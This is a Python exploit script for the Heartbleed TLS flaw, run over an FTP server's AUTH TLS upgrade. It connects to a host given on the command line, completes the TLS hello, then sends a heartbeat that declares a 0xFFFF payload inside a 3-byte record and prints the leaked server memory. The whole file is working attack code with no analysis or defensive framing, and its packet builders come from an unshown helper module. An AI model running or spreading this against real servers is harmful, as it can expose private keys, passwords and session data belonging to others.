#!/usr/bin/python3

import sys
import socket
import struct

from utils import *

host = sys.argv[1]
port = sys.argv[2]

def recv_ftp_resp(s):
    resp = s.recv(2)
    while b"\r" not in resp[-2:]:
        resp += s.recv(2)
    if resp[-1] != "\n":
        resp += s.recv(1)
    return resp.decode().strip()

def recv_bytes(s, length):
    data = b''
    while len(data) < length:
        chunk = s.recv(length - len(data))
        assert chunk
        data += chunk
    return data

def recv_tls_resp(s):
    header = recv_bytes(s, 5)
    ctype,v,length = struct.unpack('>BHH', header)
    data = recv_bytes(s, length)
    return ctype,data

print("Connecting to {}:{}".format(host, port))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
sys.stdout.write("Banner: ")
print(recv_ftp_resp(s))

print("Sending AUTH TLS...")
s.send(b"AUTH TLS\n")
resp = recv_ftp_resp(s)
print(resp)
assert "234" in resp

print("Sending TLSv1.2 Client Hello...")
s.send(hello_record())
resp = recv_tls_resp(s)
assert resp[0] == 0x16 # we expect handshake in response

print("Sending Heartbeat of SSL Record Length = 3, but Payload length = 0xFFFF...")
s.send(get_heartbeat())
resp = recv_tls_resp(s)
print(resp)
